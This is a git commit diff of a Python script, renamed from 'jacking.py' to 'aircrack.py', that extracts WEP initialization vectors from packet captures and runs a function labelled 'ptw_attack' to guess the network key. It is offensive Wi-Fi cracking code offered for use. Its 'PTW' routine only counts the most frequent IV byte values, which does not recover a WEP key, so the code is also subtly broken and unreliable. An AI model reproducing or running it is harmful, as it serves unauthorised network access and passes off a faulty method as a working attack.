526ccfc59ab6db464cd9033d00f9e6e34898ef53
mephisto-v <agentunknown@infopeklo.cz>
2025-03-31 15:56:04 +0200

    Update and rename jacking.py to aircrack.py

--- aircrack.py
+++ aircrack.py
@@ -7,18 +7,19 @@ def extract_ivs(pcap_file):
     packets = scapy.rdpcap(pcap_file)
     ivs = []
     for packet in packets:
-        if packet.haslayer(scapy.Dot11WEP):
+        if packet.haslayer(scapy.Dot11WEP) and hasattr(packet, 'iv'):
             iv = bytes(packet.iv)
-            ivs.append(iv)
+            if len(iv) == 3:  # Ensure IV is 3 bytes as expected in WEP
+                ivs.append(iv)
     return ivs
 
 def ptw_attack(ivs, key_size=13):
     byte_guesses = [Counter() for _ in range(key_size)]
     for iv in ivs:
-        for i in range(len(iv)):
+        for i in range(min(len(iv), key_size)):
             byte_guesses[i][iv[i]] += 1
     
-    key = bytes([max(byte_guess, key=byte_guess.get) for byte_guess in byte_guesses])
+    key = bytes([max(byte_guess, key=byte_guess.get, default=0) for byte_guess in byte_guesses])
     return key
 
 def main():
